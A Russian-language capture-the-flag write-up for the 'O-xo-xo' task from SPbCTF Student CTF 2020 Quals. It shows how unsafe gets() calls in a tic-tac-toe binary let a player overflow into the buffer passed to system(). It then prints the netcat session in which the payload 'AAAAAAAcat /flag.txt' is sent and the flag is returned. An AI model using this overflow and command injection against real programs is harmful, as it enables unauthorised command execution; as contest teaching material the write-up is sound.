# O-xo-xo writeup

Воспользуемся `Hex-Rays` для поиска уязвимости в предоставленном в таске исполняемом файле:

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/SPbCTF's%20Student%20CTF%202020%20Quals/O-xo-xo/assets/pseudocode_of_main_1.jpg)

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/SPbCTF's%20Student%20CTF%202020%20Quals/O-xo-xo/assets/pseudocode_of_main_2.jpg)

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/SPbCTF's%20Student%20CTF%202020%20Quals/O-xo-xo/assets/pseudocode_of_main_3.jpg)

Как мы видим, сразу в нескольких участках кода используется уязвимая функция `gets`, считывающая данные до символа переноса строки и, следовательно, позволяющая нам 
переполнить выделенный буфер.

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/SPbCTF's%20Student%20CTF%202020%20Quals/O-xo-xo/assets/pseudocode_of_main_4.jpg)

Нашей целью будет являться выполнение команды `cat /flag.txt` на удалённом сервере - в этом нам поможет предоставленная в бинарном файле функция `system`, принимающая в 
качестве аргумента буфер `dest` - таким образом, для того, чтобы получить флаг, нам необходимо перезаписать хранящуюся в буфере `dest` строку с командой на нашу строку. 

Откроем вкладку `Stack of main` в `IDA PRO` и посмотрим на организацию стека эксплуатируемой программы:

![Image alt](https://github.com/Burgos1337/capture-the-flag-writeups/blob/master/2020/SPbCTF's%20Student%20CTF%202020%20Quals/O-xo-xo/assets/stack_of_main.jpg)

Получается, что буфер `dest`, хранящий в себе строку с командой, выполняемой на удалённой машине, располагается на стеке как раз после переполняемого буфера, следовательно, 
мы можем заставить программу прочитать флаг, передав ей на одном из ходов игры после координат нагрузку, состоящую из `7` байт мусора (заполнение первого буфера) и самой 
команды `cat /flag.txt` (перезапись содержимого буфера `dest`) - тогда в конце игры вместо прощания будет выведен флаг:
 
```
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/O-xo-xo$ nc -nv 109.233.57.95 20202
Connection to 109.233.57.95 20202 port [tcp/*] succeeded!
Turn # 1, it's x's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 _ _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ _ _ _ _
 5 _ _ _ _ _ _
 6 _ _ _ _ _ _

Turn # 2, it's o's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 _ _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ _ x _ _
 5 _ _ _ _ _ _
 6 _ _ _ _ _ _

Where do you want to put your 'o' (x y)? 1 2
Turn # 3, it's x's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ _ x _ _
 5 _ _ _ _ _ _
 6 _ _ _ _ _ _

Turn # 4, it's o's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ _ x _ _
 5 _ _ _ x _ _
 6 _ _ _ _ _ _

Where do you want to put your 'o' (x y)? 3 4
Turn # 5, it's x's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ _ _ _
 4 _ _ o x _ _
 5 _ _ _ x _ _
 6 _ _ _ _ _ _

Turn # 6, it's o's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ x _ _
 4 _ _ o x _ _
 5 _ _ _ x _ _
 6 _ _ _ _ _ _

Where do you want to put your 'o' (x y)? 2 5 AAAAAAAcat /flag.txt
Turn # 7, it's x's turn

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ _ _ _
 3 _ _ _ x _ _
 4 _ _ o x _ _
 5 _ o _ x _ _
 6 _ _ _ _ _ _

x has won the game!

   1 2 3 4 5 6
 1 _ _ _ _ _ _
 2 o _ _ x _ _
 3 _ _ _ x _ _
 4 _ _ o x _ _
 5 _ o _ x _ _
 6 _ _ _ _ _ _

What would you want to do next?
 1) play again
 2) quit the game
? 2
spbctf{OxOxO_N0w_y0u_REALLY_h4ve_w0n}
burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/SPbCTF's Student CTF 2020 Quals/O-xo-xo$                                                  
```
